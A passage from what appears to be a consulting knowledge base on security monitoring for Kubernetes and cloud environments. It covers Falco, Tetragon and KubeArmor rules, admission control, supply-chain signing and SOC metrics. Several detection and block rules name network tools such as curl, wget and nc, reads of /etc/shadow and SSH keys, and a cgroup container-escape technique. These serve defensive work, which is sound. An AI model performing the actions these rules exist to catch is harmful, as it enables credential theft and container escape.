| **AWS ECR Scanning** | AWS native | Clair (basic), Inspector (enhanced) | Auto-scan on push, integrated with Security Hub | ECR, CodePipeline |
| **Azure ACR Scanning** | Azure native | Qualys | Integrated with Defender for Containers | ACR, DevOps pipelines |
| **GCP Artifact Analysis** | GCP native | Google DB | Auto-scan, Binary Authorization integration | Artifact Registry, Cloud Build |

**Trivy CLI Examples:**
```bash
# Scan a container image
trivy image --severity HIGH,CRITICAL nginx:1.25

# Scan with SBOM output
trivy image --format cyclonedx -o sbom.json myapp:latest

# Scan Kubernetes cluster
trivy k8s --report=summary cluster

# Scan IaC (Terraform, Kubernetes manifests)
trivy config ./k8s-manifests/

# Scan filesystem for secrets
trivy fs --scanners secret ./src/

# Generate vulnerability report in table format
trivy image --format table --severity CRITICAL myapp:latest
```

### Runtime Security: Falco

Falco is the CNCF runtime security project using eBPF/kernel module for syscall monitoring.

**Rule Structure:**
```yaml
- rule: Terminal Shell in Container
  desc: >
    A shell was spawned by a program in a container with an attached terminal.
    This indicates interactive shell access to a running container.
  condition: >
    spawned_process and container and shell_procs
    and proc.tty != 0
    and container_entrypoint
  output: >
    A shell was spawned in a container with an attached terminal
    (evt.type=%evt.type user=%user.name user_uid=%user.uid
    user_loginuid=%user.loginuid process=%proc.name
    proc_exepath=%proc.exepath parent=%proc.pname
    cmdline=%proc.cmdline pid=%proc.pid terminal=%proc.tty
    container_id=%container.id container_name=%container.name
    image=%container.image.repository:%container.image.tag
    k8s_ns=%k8s.ns.name k8s_pod=%k8s.pod.name)
  priority: NOTICE
  tags: [container, shell, mitre_execution, T1059]
```

**Custom Falco Rules for Common Attacks:**

```yaml
# Detect container escape via mounting host filesystem
- rule: Mount Host Filesystem in Container
  desc: Detect attempts to mount the host filesystem from within a container
  condition: >
    evt.type in (mount, umount2) and container
    and evt.arg.source startswith "/host"
  output: >
    Host filesystem mount attempted in container
    (user=%user.name command=%proc.cmdline container=%container.name
    image=%container.image.repository mount_source=%evt.arg.source)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation, T1611]

# Detect crypto mining
- rule: Detect Crypto Mining Activity
  desc: Detect connections to known mining pools
  condition: >
    evt.type in (connect, sendto) and container
    and (fd.sip.name contains "mining" or
         fd.sip.name contains "pool" or
         fd.sip.name contains "nicehash" or
         fd.sip.name contains "nanopool" or
         fd.sport in (3333, 4444, 5555, 7777, 8888, 9999, 14444, 45700))
  output: >
    Crypto mining connection detected
    (user=%user.name process=%proc.name connection=%fd.name
    container=%container.name k8s_pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, cryptomining, mitre_impact, T1496]

# Detect reading sensitive files
- rule: Read Sensitive File in Container
  desc: Attempt to read sensitive files that should not be accessed in containers
  condition: >
    open_read and container
    and (fd.name startswith /etc/shadow or
         fd.name startswith /etc/sudoers or
         fd.name startswith /root/.ssh or
         fd.name startswith /root/.bash_history or
         fd.name contains "/.kube/config")
    and not proc.name in (sshd, sudo, su)
  output: >
    Sensitive file read in container
    (user=%user.name file=%fd.name process=%proc.name
    container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [container, filesystem, mitre_credential_access, T1552]

# Detect kubectl exec into pods
- rule: K8s Exec Into Pod
  desc: Detect exec into pods via Kubernetes API
  condition: >
    spawned_process and container
    and proc.pname = "runc:[2:INIT]"
    and proc.name in (bash, sh, dash, zsh, csh, fish, tcsh)
  output: >
    Exec into pod detected
    (user=%user.name command=%proc.cmdline
    container=%container.name k8s_ns=%k8s.ns.name
    k8s_pod=%k8s.pod.name image=%container.image.repository)
  priority: NOTICE
  tags: [container, k8s, mitre_execution, T1609]

# Detect outbound connections from unexpected containers
- rule: Unexpected Outbound Connection
  desc: Container making outbound connection that typically should not
  condition: >
    evt.type in (connect) and container
    and fd.typechar = '4'
    and fd.direction = '>'
    and not fd.sip in (rfc_1918_addresses)
    and k8s.ns.name in (database, backend-services)
  output: >
    Unexpected outbound connection from restricted namespace
    (user=%user.name process=%proc.name connection=%fd.name
    container=%container.name k8s_ns=%k8s.ns.name)
  priority: WARNING
  tags: [container, network, mitre_exfiltration, T1048]
```

**Falcosidekick Output Channels:**

| Output | Use Case |
|--------|----------|
| **Slack** | Real-time alerts to security channel |
| **Elasticsearch** | Long-term storage and Kibana dashboards |
| **AWS CloudWatch** | AWS-native log aggregation |
| **Prometheus/AlertManager** | Metric-based alerting on Falco events |
| **NATS/Kafka** | Event streaming pipeline |
| **OpsGenie/PagerDuty** | On-call escalation |
| **Loki** | Grafana-native log storage |
| **Webhook** | Custom SOAR integration |
| **Azure Event Hubs** | Sentinel integration |
| **GCP Pub/Sub** | Chronicle integration |

### Runtime Security: Tetragon

Tetragon (Cilium project) provides eBPF-based security observability and runtime enforcement.

**TracingPolicy CRD:**
```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: monitor-sensitive-file-access
spec:
  kprobes:
    - call: "fd_install"
      syscall: false
      args:
        - index: 0
          type: int
        - index: 1
          type: "file"
      selectors:
        - matchArgs:
            - index: 1
              operator: "Prefix"
              values:
                - "/etc/shadow"
                - "/etc/passwd"
                - "/etc/sudoers"
                - "/root/.ssh"
          matchActions:
            - action: Sigkill  # Kill the process immediately
```

**Network Policy Enforcement:**
```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-outbound-to-mining-pools
spec:
  tracepoints:
    - subsystem: "syscalls"
      event: "sys_enter_connect"
      args:
        - index: 1
          type: "sockaddr"
      selectors:
        - matchArgs:
            - index: 1
              operator: "DAddr"
              values:
                - "mining-pool-ip-1"
                - "mining-pool-ip-2"
          matchActions:
            - action: Sigkill
          matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "host_ns"  # Only enforce in containers
```

**Process Execution Monitoring:**
```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: monitor-process-execution
spec:
  kprobes:
    - call: "__x64_sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchArgs:
            - index: 0
              operator: "In"
              values:
                - "/usr/bin/curl"
                - "/usr/bin/wget"
                - "/usr/bin/nc"
                - "/usr/bin/ncat"
                - "/usr/bin/nmap"
          matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "host_ns"
          matchActions:
            - action: Post  # Log but don't kill
```

**Key Tetragon Advantages over Falco:**
| Aspect | Tetragon | Falco |
|--------|----------|-------|
| **Technology** | Pure eBPF | eBPF or kernel module |
| **Enforcement** | In-kernel (Sigkill, Override) | Alert only (response via Falcosidekick) |
| **Latency** | Synchronous (no user-space delay) | Async (user-space processing) |
| **Kubernetes** | Deep Cilium integration | Kubernetes-aware via metadata |
| **Overhead** | < 1% measured | Low but higher than Tetragon |
| **Maturity** | Newer (CNCF Sandbox) | More mature (CNCF Graduated) |

### Runtime Security: KubeArmor

KubeArmor enforces security policies at the kernel level using LSMs (AppArmor, BPF-LSM, SELinux).

**Security Policy Example:**
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: restrict-web-app
  namespace: production
spec:
  selector:
    matchLabels:
      app: web-frontend
  process:
    matchPaths:
      - path: /bin/bash
      - path: /bin/sh
      - path: /usr/bin/curl
      - path: /usr/bin/wget
    action: Block
  file:
    matchDirectories:
      - dir: /etc/
        recursive: true
        action: Audit
      - dir: /root/
        recursive: true
        action: Block
    matchPaths:
      - path: /etc/shadow
        action: Block
      - path: /etc/passwd
        readOnly: true
        action: Allow
  network:
    matchProtocols:
      - protocol: raw
        action: Block
  capabilities:
    matchCapabilities:
      - capability: SYS_ADMIN
        action: Block
      - capability: SYS_PTRACE
        action: Block
```

### Kubernetes Network Policies Monitoring

**Cilium NetworkPolicy (L7-aware):**
```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: restrict-backend-traffic
  namespace: production
spec:
  endpointSelector:
    matchLabels:
      app: backend-api
  ingress:
    - fromEndpoints:
        - matchLabels:
            app: frontend
      toPorts:
        - ports:
            - port: "8080"
              protocol: TCP
          rules:
            http:
              - method: "GET"
                path: "/api/v1/.*"
              - method: "POST"
                path: "/api/v1/orders"
  egress:
    - toEndpoints:
        - matchLabels:
            app: database
      toPorts:
        - ports:
            - port: "5432"
              protocol: TCP
    - toFQDNs:
        - matchPattern: "*.googleapis.com"
      toPorts:
        - ports:
            - port: "443"
              protocol: TCP
```

**Monitoring Denied Connections (Cilium Hubble):**
```bash
# Stream denied flows in real-time
hubble observe --verdict DROPPED --namespace production

# Query denied flows with specific source
hubble observe --verdict DROPPED \
  --from-label "app=compromised-pod" \
  --output json

# Count denied flows by destination
hubble observe --verdict DROPPED \
  --since 1h \
  --output json | jq -r '.flow.destination.labels[]' | sort | uniq -c | sort -rn
```

### Secrets Management Monitoring

**External Secrets Operator Monitoring:**
```yaml
# Alert on failed secret synchronization
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: external-secrets-alerts
spec:
  groups:
    - name: external-secrets
      rules:
        - alert: ExternalSecretSyncFailed
          expr: |
            externalsecret_status_condition{condition="Ready", status="False"} == 1
          for: 10m
          labels:
            severity: critical
          annotations:
            summary: "ExternalSecret {{ $labels.name }} sync failed"
            description: "Secret {{ $labels.name }} in namespace {{ $labels.namespace }} has not synced for 10 minutes"

        - alert: SecretRotationOverdue
          expr: |
            (time() - externalsecret_status_sync_time) > 86400
          for: 1h
          labels:
            severity: warning
          annotations:
            summary: "ExternalSecret {{ $labels.name }} rotation overdue"
```

**Vault Audit Log Analysis:**
```json
{
  "type": "response",
  "time": "2025-03-15T10:30:00Z",
  "auth": {
    "client_token": "hmac-sha256:abc123...",
    "accessor": "hmac-sha256:def456...",
    "display_name": "kubernetes-production-web-app",
    "policies": ["web-app-read"],
    "metadata": {
      "role": "web-app",
      "service_account_name": "web-app-sa",
      "service_account_namespace": "production"
    }
  },
  "request": {
    "operation": "read",
    "path": "secret/data/production/database",
    "remote_address": "10.0.5.23"
  },
  "response": {
    "data": {
      "keys": ["username", "password", "host"]
    }
  }
}
```

**Key Vault Audit Queries (Splunk SPL):**
```spl
index=vault sourcetype=vault_audit
| stats count dc(request.path) as unique_secrets
    values(request.path) as accessed_secrets
    by auth.display_name auth.metadata.service_account_namespace
| where unique_secrets > 10
| sort -unique_secrets
```

### Container Escape Detection Patterns

**Detection Matrix:**

| Escape Technique | Detection Method | Tool |
|-----------------|-----------------|------|
| **Privileged container** | Audit log: privileged=true in pod spec | Kubernetes audit, OPA/Kyverno |
| **Docker socket mount** | Volume mount of /var/run/docker.sock | Falco rule, admission controller |
| **Host PID namespace** | hostPID=true in pod spec | Kubernetes audit, PSA |
| **Kernel exploit (e.g., DirtyPipe)** | Unexpected syscalls, capability changes | Tetragon, Falco |
| **cgroup escape** | Write to cgroup release_agent | Falco rule (file write monitoring) |
| **Mount namespace** | mount syscall with host paths | Tetragon TracingPolicy |
| **procfs escape** | Reading /proc/1/root | Falco rule |
| **Symlink attack** | Symlink creation in /var/log targeting host | Falco file monitoring |

**Falco Rule for Container Escape Attempts:**
```yaml
- rule: Container Escape Attempt via cgroup
  desc: Detect writing to cgroup release_agent which can lead to container escape
  condition: >
    open_write and container
    and fd.name endswith "/release_agent"
    and fd.directory contains "/sys/fs/cgroup"
  output: >
    Container escape attempt via cgroup release_agent
    (user=%user.name command=%proc.cmdline file=%fd.name
    container=%container.name image=%container.image.repository
    k8s_ns=%k8s.ns.name k8s_pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation, T1611]
```

### Admission Control: OPA Gatekeeper vs Kyverno

**OPA Gatekeeper Constraint Template:**
```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels
        violation[{"msg": msg}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_]}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("Missing required labels: %v", [missing])
        }

---
# Constraint using the template
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Namespace"]
  parameters:
    labels:
      - "team"
      - "environment"
      - "cost-center"
```

**Gatekeeper: Block Privileged Containers:**
```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8spspprivileged
spec:
  crd:
    spec:
      names:
        kind: K8sPSPPrivileged
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8spspprivileged
        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          container.securityContext.privileged == true
          msg := sprintf("Privileged container not allowed: %v", [container.name])
        }
        violation[{"msg": msg}] {
          container := input.review.object.spec.initContainers[_]
          container.securityContext.privileged == true
          msg := sprintf("Privileged init container not allowed: %v", [container.name])
        }
```

**Kyverno Policy (Equivalent):**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged-containers
  annotations:
    policies.kyverno.io/title: Disallow Privileged Containers
    policies.kyverno.io/category: Pod Security Standards (Baseline)
    policies.kyverno.io/severity: high
    policies.kyverno.io/subject: Pod
    policies.kyverno.io/description: >-
      Privileged containers can access all host devices and have full
      kernel capabilities. This policy prevents privileged containers.
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: deny-privileged
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Privileged containers are not allowed."
        pattern:
          spec:
            containers:
              - securityContext:
                  privileged: "false"
            =(initContainers):
              - securityContext:
                  privileged: "false"
```

**Kyverno: Require Image Signature (Sigstore/Cosign):**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  rules:
    - name: verify-cosign-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
      verifyImages:
        - imageReferences:
            - "myregistry.io/*"
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/myorg/*"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor:
                      url: https://rekor.sigstore.dev
```

**Comparison: Gatekeeper vs Kyverno:**

| Aspect | OPA Gatekeeper | Kyverno |
|--------|---------------|---------|
| **Language** | Rego (learning curve) | YAML-native (Kubernetes-native) |
| **CNCF Status** | OPA is Graduated | Incubating |
| **Policy Types** | Validate only | Validate, Mutate, Generate, Cleanup |
| **Image Verification** | Via external webhook | Native (Sigstore, Notary) |
| **Background Scans** | Audit existing resources | Audit + auto-generate reports |
| **Complexity** | Higher (Rego proficiency required) | Lower (YAML patterns) |
| **Flexibility** | Very high (general-purpose Rego) | High (but K8s-focused) |
| **Report Generation** | Manual/external | Built-in PolicyReport CRD |
| **Best For** | Teams with Rego expertise, complex policies | K8s-focused teams, rapid adoption |

---

## 14. Supply Chain Security

### Sigstore Ecosystem

**Components:**

| Component | Purpose | How It Works |
|-----------|---------|-------------|
| **Cosign** | Sign and verify container images | Generates signatures and attaches to OCI registries |
| **Fulcio** | Certificate authority | Issues short-lived certificates based on OIDC identity |
| **Rekor** | Transparency log | Immutable, append-only log of signing events |

**Cosign Workflow:**
```bash
# Sign an image (keyless, using OIDC identity)
cosign sign myregistry.io/myapp:v1.2.3

# Sign with a key
cosign sign --key cosign.key myregistry.io/myapp:v1.2.3

# Verify a signature (keyless)
cosign verify \
  --certificate-identity "https://github.com/myorg/myapp/.github/workflows/release.yml@refs/tags/v1.2.3" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  myregistry.io/myapp:v1.2.3

# Attest (attach in-toto attestation)
cosign attest --predicate sbom.json --type cyclonedx myregistry.io/myapp:v1.2.3

# Verify attestation
cosign verify-attestation \
  --type cyclonedx \
  --certificate-identity "..." \
  --certificate-oidc-issuer "..." \
  myregistry.io/myapp:v1.2.3
```

### SLSA Framework

**SLSA Levels (v1.0):**

| Level | Requirements | Trust |
|-------|-------------|-------|
| **Build L0** | No guarantees | No provenance |
| **Build L1** | Provenance exists | Package-level provenance, not tamper-resistant |
| **Build L2** | Hosted build service | Signed provenance from hosted build platform |
| **Build L3** | Hardened build platform | Tamper-resistant provenance, isolated builds |

**SLSA Provenance Example (in-toto):**
```json
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [
    {
      "name": "myregistry.io/myapp",
      "digest": {
        "sha256": "abc123..."
      }
    }
  ],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {
      "buildType": "https://github.com/slsa-framework/slsa-github-generator/generic@v2",
      "externalParameters": {
        "source": {
          "uri": "git+https://github.com/myorg/myapp@refs/tags/v1.2.3",
          "digest": {
            "sha1": "def456..."
          }
        }
      }
    },
    "runDetails": {
      "builder": {
        "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.0.0"
      },
      "metadata": {
        "invocationId": "https://github.com/myorg/myapp/actions/runs/12345"
      }
    }
  }
}
```

**Integration with Kubernetes Admission:**
```
CI/CD Build --> Sign with Cosign --> Record in Rekor
                                         |
                                         v
kubectl apply --> Kyverno/Gatekeeper --> Verify Signature
                                     --> Verify Attestation (SBOM, vuln scan)
                                     --> Verify SLSA Provenance
                                     --> Allow/Deny deployment
```

---

## 15. Consulting Engagement Guidance

### Security Observability Maturity Model

| Level | SIEM | Cloud Security | Container Security | SOAR |
|-------|------|---------------|-------------------|------|
| **L1 - Ad Hoc** | Basic log collection, no SIEM | Default cloud logging | No runtime monitoring | Manual response |
| **L2 - Foundational** | SIEM deployed, default rules | GuardDuty/Defender/SCC enabled | Image scanning in CI | Basic alerting |
| **L3 - Managed** | Custom rules, UEBA, tuned alerts | CSPM + CWP, compliance monitoring | Falco/Tetragon + admission control | Playbooks for top 10 alert types |
| **L4 - Optimized** | RBA, threat hunting, ML detections | Security Lake, cross-cloud correlation | Supply chain security, network policies | 70%+ automation rate |
| **L5 - Adaptive** | AI-assisted detection, continuous improvement | Zero-trust security posture | eBPF enforcement, attestation-based deployment | Autonomous response with human oversight |

### Quick Wins by Cloud Provider

**AWS Quick Wins:**
1. Enable GuardDuty (all protection plans) in all regions
2. Enable Security Hub with FSBP and CIS standards
3. Create Organization CloudTrail with CloudTrail Lake
4. Enable VPC Flow Logs in all VPCs
5. Enable AWS Config with conformance packs

**Azure Quick Wins:**
1. Enable Defender for Cloud (CSPM + Servers + Containers)
2. Connect Entra ID logs to Sentinel
3. Enable UEBA in Sentinel
4. Configure NSG flow logs
5. Enable Defender for Key Vault

**GCP Quick Wins:**
1. Enable SCC Premium (or Enterprise)
2. Enable Data Access audit logs for critical services
3. Configure VPC Service Controls for sensitive projects
4. Enable Binary Authorization for GKE
5. Export audit logs to Chronicle

### SIEM Selection Decision Tree

```
Start: What is your primary cloud?
|
+-- Microsoft Azure/M365 heavy?
|   YES --> Microsoft Sentinel
|           (Free M365 data, native Entra ID, Defender XDR integration)
|
+-- Google Cloud primary?
|   YES --> Chronicle SIEM
|           (Unlimited ingest, Mandiant intel, native GCP integration)
|
+-- Existing Splunk investment?
|   YES --> Splunk Enterprise Security
|           (Protect existing investment, most mature ecosystem)
|
+-- Cost-sensitive, open-source preferred?
|   YES --> Elastic Security (self-managed) or Wazuh
|           (Free SIEM capabilities, community support)
|
+-- High data volume, multi-cloud?
|   YES --> Chronicle (per-employee) or Elastic Cloud
|           (Unlimited ingest or efficient resource pricing)
|
+-- Need integrated SIEM+SOAR+EDR?
    YES --> Microsoft Sentinel + Defender XDR
            or Splunk ES + SOAR + Cisco SecureX
            or Chronicle + SOAR + Mandiant
```

### OpenTelemetry Collector Integration with SIEM

The OTel Collector can forward security-relevant telemetry to SIEMs:

```yaml
# OTel Collector config for security log forwarding
receivers:
  filelog:
    include:
      - /var/log/auth.log
      - /var/log/secure
      - /var/log/audit/audit.log
    operators:
      - type: regex_parser
        regex: '^(?P<timestamp>\S+ \S+ \S+) (?P<hostname>\S+) (?P<process>\S+)\[(?P<pid>\d+)\]: (?P<message>.*)$'

  # Kubernetes audit logs
  filelog/k8s-audit:
    include:
      - /var/log/kubernetes/audit/*.log
    operators:
      - type: json_parser
        timestamp:
          parse_from: attributes.stageTimestamp
          layout: '%Y-%m-%dT%H:%M:%S.%LZ'

processors:
  attributes:
    actions:
      - key: environment
        value: production
        action: insert
      - key: cluster_name
        value: prod-us-east-1
        action: insert

  filter:
    logs:
      include:
        match_type: regexp
        bodies:
          - '.*[Ff]ailed.*'
          - '.*[Ee]rror.*'
          - '.*[Dd]enied.*'
          - '.*[Uu]nauthorized.*'
          - '.*sudo.*'
          - '.*su:.*'

exporters:
  # Forward to Splunk HEC
  splunk_hec:
    token: "${SPLUNK_HEC_TOKEN}"
    endpoint: "https://splunk-hec.example.com:8088/services/collector"
    source: "otel-collector"
    sourcetype: "_json"
    index: "security"

  # Forward to Elastic
  elasticsearch:
    endpoints: ["https://elasticsearch.example.com:9200"]
    logs_index: "security-logs"
    auth:
      authenticator: basicauth

  # Forward to Sentinel (via Azure Monitor)
  azuremonitor:
    endpoint: "https://<dcr-endpoint>.ingest.monitor.azure.com"
    authentication:
      authenticator: azure_auth
```

---

## Key Dates and Timelines

| Date | Event |
|------|-------|
| **July 2025** | New Sentinel customers auto-onboarded to Defender portal |
| **March 2027** | Sentinel no longer available in Azure portal (Defender portal only) |
| **November 2025** | Elastic Serverless Security updated pricing tiers |
| **May 2025** | SCC findings retention changed to 90 days for new activations |
| **2025** | GuardDuty Extended Threat Detection (multi-stage attack sequences) |
| **2025** | Chronicle composite detections GA |
| **2025** | Sentinel UEBA expanded to new data sources |
| **2025** | KubeArmor v0.11+ with ARMv9 and OTel integration |
| **2025** | Tetragon reaching production maturity in enterprise deployments |
| **2025** | SLSA v1.0 framework widely adopted in CI/CD pipelines |
| **2025** | Gartner names Google Security Operations a SIEM Leader |

---

*Document version: 1.0 | Last updated: February 2025 | Classification: Internal - Consulting Knowledge Base*


---

# Part III: Operations, Compliance, and Architecture

---

## 1. SOC Observability and Metrics

### 1.1 SOC Key Performance Indicators (KPIs)

A Security Operations Center is only as effective as its ability to measure and improve. The following KPIs represent the measurable dimensions of SOC performance that observability must capture.

#### Core Time-Based KPIs

| KPI | Definition | Industry Benchmark (2024-2025) | Elite SOC Target | Measurement Method |
|-----|-----------|-------------------------------|-------------------|-------------------|
| **MTTD** (Mean Time to Detect) | Average time from threat occurrence to detection | 197 days (IBM Cost of a Breach 2024) | < 24 hours | `timestamp_detected - timestamp_compromised` |
| **MTTA** (Mean Time to Acknowledge) | Average time from alert firing to analyst assignment | 5-15 minutes (Tier 1) | < 5 minutes | `timestamp_acknowledged - timestamp_alert_fired` |
| **MTTI** (Mean Time to Investigate) | Average time from acknowledgement to root cause identification | 30-60 minutes (Tier 1 triage) | < 30 minutes | `timestamp_rca_identified - timestamp_acknowledged` |
| **MTTR** (Mean Time to Respond/Remediate) | Average time from detection to containment/remediation | 68 days (IBM 2024) | < 4 hours (containment) | `timestamp_contained - timestamp_detected` |
| **MTTC** (Mean Time to Contain) | Average time from detection to threat containment specifically | 12-24 hours | < 1 hour | `timestamp_contained - timestamp_detected` |
| **Dwell Time** | Total time attacker remains undetected | 10 days median (Mandiant M-Trends 2024) | < 24 hours | `timestamp_detected - timestamp_initial_access` |

#### Volume and Quality KPIs

| KPI | Definition | Healthy Range | Warning Threshold |
|-----|-----------|---------------|-------------------|
| **Alert Volume** | Total alerts generated per day/week/month | Varies by org size; 500-5,000/day for mid-enterprise | > 10,000/day without corresponding headcount |
| **True Positive Rate (TPR)** | Percentage of alerts that are actual threats | 30-50% (mature SOC) | < 15% indicates severe tuning issues |
| **False Positive Rate (FPR)** | Percentage of alerts that are benign | 50-70% (typical) | > 85% indicates alert fatigue risk |
| **Escalation Rate** | Percentage of L1 alerts escalated to L2/L3 | 10-20% | > 40% suggests L1 skills gap or poor playbooks |
| **Alert-to-Incident Ratio** | Alerts that become confirmed incidents | 1:50 to 1:200 | > 1:500 suggests detection rules too noisy |
| **Analyst Utilization** | Percentage of analyst time on active investigation vs. overhead | 60-70% investigation | < 40% suggests tooling or process friction |
| **Ticket Backlog** | Unresolved security tickets at any point | < 2x daily capacity | > 5x daily capacity |
| **MITRE Coverage** | Percentage of ATT&CK techniques with detection rules | 40-60% (mature) | < 20% indicates major blind spots |
| **Automation Rate** | Percentage of alerts handled without human intervention | 30-50% (SOAR-enabled) | < 10% indicates automation debt |

#### SOC Metrics Dashboard (Prometheus/Grafana Example)

```yaml
# Prometheus recording rules for SOC metrics
groups:
  - name: soc_kpis
    interval: 1m
    rules:
      # Mean Time to Detect (rolling 30-day)
      - record: soc:mttd:avg_30d
        expr: |
          avg_over_time(
            (soc_incident_detected_timestamp - soc_incident_occurred_timestamp)[30d:1h]
          ) / 3600
        labels:
          unit: hours

      # Mean Time to Acknowledge (rolling 7-day)
      - record: soc:mtta:avg_7d
        expr: |
          avg_over_time(
            (soc_alert_acknowledged_timestamp - soc_alert_fired_timestamp)[7d:1h]
          ) / 60
        labels:
          unit: minutes

      # Mean Time to Respond (rolling 30-day)
      - record: soc:mttr:avg_30d
        expr: |
          avg_over_time(
            (soc_incident_contained_timestamp - soc_incident_detected_timestamp)[30d:1h]
          ) / 3600
        labels:
          unit: hours

      # True Positive Rate (rolling 7-day)
      - record: soc:true_positive_rate:7d
        expr: |
          sum(increase(soc_alerts_total{disposition="true_positive"}[7d]))
          /
          sum(increase(soc_alerts_total[7d]))

      # False Positive Rate (rolling 7-day)
      - record: soc:false_positive_rate:7d
        expr: |
          sum(increase(soc_alerts_total{disposition="false_positive"}[7d]))
          /
          sum(increase(soc_alerts_total[7d]))

      # Alert-to-Incident Ratio (rolling 30-day)
      - record: soc:alert_to_incident_ratio:30d
        expr: |
          sum(increase(soc_alerts_total[30d]))
          /
          sum(increase(soc_incidents_total[30d]))

      # Analyst Utilization
      - record: soc:analyst_utilization:avg
        expr: |
          avg(
            soc_analyst_investigation_seconds
            /
            (soc_analyst_investigation_seconds + soc_analyst_overhead_seconds)
          )

      # Alert Backlog
      - record: soc:alert_backlog:current
        expr: |
          soc_alerts_total{status="open"} - soc_alerts_total{status=~"closed|resolved"}

      # MITRE ATT&CK Coverage
      - record: soc:mitre_coverage:percentage
        expr: |
          count(soc_detection_rule_info{mitre_technique!=""})
          /
          scalar(soc_mitre_techniques_total)
```

```yaml
# Alerting rules for SOC health
groups:
  - name: soc_health_alerts
    rules:
      - alert: HighFalsePositiveRate
        expr: soc:false_positive_rate:7d > 0.85
        for: 24h
        labels:
          severity: warning
          team: soc-engineering
        annotations:
          summary: "False positive rate exceeds 85% over 7 days"
          description: "Current FPR: {{ $value | humanizePercentage }}. Review and tune noisy detection rules."

      - alert: MTTRExceedsTarget
        expr: soc:mttr:avg_30d > 72
        for: 1h
        labels:
          severity: warning
          team: soc-management
        annotations:
          summary: "Mean Time to Respond exceeds 72 hours (30-day average)"
          description: "Current MTTR: {{ $value | humanize }} hours. Review incident response processes."

      - alert: AlertBacklogCritical
        expr: soc:alert_backlog:current > 5 * avg_over_time(soc_alerts_processed_daily[7d])
        for: 4h
        labels:
          severity: critical
          team: soc-management
        annotations:
          summary: "Alert backlog exceeds 5x daily processing capacity"
          description: "Current backlog: {{ $value }}. Consider staffing adjustments or automation."

      - alert: LowMITRECoverage
        expr: soc:mitre_coverage:percentage < 0.20
        for: 24h
        labels:
          severity: warning
          team: detection-engineering
        annotations:
          summary: "MITRE ATT&CK detection coverage below 20%"
          description: "Current coverage: {{ $value | humanizePercentage }}. Prioritize detection rule development."
```

### 1.2 SOC Maturity Model and Tier Structure

#### SOC Maturity Levels

```
Level 0: No SOC          - Ad hoc security monitoring, no dedicated team
Level 1: Reactive        - Basic SIEM, alert-driven, primarily L1 analysts
Level 2: Proactive       - Threat hunting, SOAR automation, L1/L2/L3 structure
Level 3: Optimized       - Detection-as-Code, full ATT&CK coverage, purple team
Level 4: Innovative      - AI-augmented, predictive, continuous improvement
Level 5: Autonomous      - Self-healing, fully automated detection and response
```

#### SOC Tier Structure and Responsibilities

| Aspect | L1 (Triage Analyst) | L2 (Incident Responder) | L3 (Threat Hunter / Senior IR) | L4 (SOC Manager / Architect) |
|--------|---------------------|--------------------------|-------------------------------|------------------------------|
| **Primary Role** | Alert triage and initial classification | Deep investigation and containment | Proactive hunting and advanced analysis | Strategy, architecture, process improvement |
| **Typical Experience** | 0-2 years | 2-5 years | 5-8 years | 8+ years |
| **Alert Handling** | Initial triage, classify TP/FP, escalate | Root cause analysis, containment actions | Complex investigations, malware analysis | Oversight, metrics review, escalation path |
| **Decision Authority** | Escalate or close | Contain, isolate, escalate to L3 | Contain, eradicate, define new detections | Policy changes, tooling decisions |
| **MITRE ATT&CK** | Recognize technique names | Map incidents to techniques | Develop detections per technique | Coverage strategy, gap prioritization |
| **Automation** | Follow automated playbooks | Tune and extend playbooks | Author new playbooks, develop detections | Architecture, SOAR strategy |
| **Tools** | SIEM dashboards, ticketing | SIEM queries, EDR, forensic tools | Threat intel platforms, sandboxes, debuggers | All + GRC, budgeting, vendor management |
| **Staffing Ratio** | 40-50% of SOC | 25-30% of SOC | 15-20% of SOC | 5-10% of SOC |
| **SLA: Initial Response** | < 15 minutes | < 30 minutes | < 1 hour | N/A |
| **Shift Coverage** | 24/7 (follow-the-sun or shift-based) | 24/7 or on-call | Business hours + on-call | Business hours |

#### SOC Operating Models

```
+-------------------------------------------------------------------+
|                    SOC Operating Models                             |
